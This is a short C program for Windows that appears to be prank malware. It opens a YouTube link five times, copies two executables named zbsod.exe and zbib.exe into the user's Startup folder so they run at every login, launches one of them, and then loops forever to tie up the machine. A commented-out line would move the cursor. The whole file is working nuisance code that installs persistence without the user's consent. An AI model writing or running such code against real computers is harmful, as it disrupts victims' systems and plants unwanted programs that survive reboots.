#include <windows.h>
#include <stdio.h>
#include <stdlib.h>


int main()
{    
    for (int i = 0; i < 5; i++)
    {
        system("start https://youtu.be/dQw4w9WgXcQ?si=_iy9BnoHWlGCyIDY");
    }

    system("copy zbsod.exe \"C:\\Users\\%username%\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\zbsod.exe\"");
    system("copy zbib.exe \"C:\\Users\\%username%\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\zbib.exe\"");
    system("start zbib.exe");

    while (1)
    {
        // SetCursorPos(2000, 2000);
    }
    
    
	return 0;
}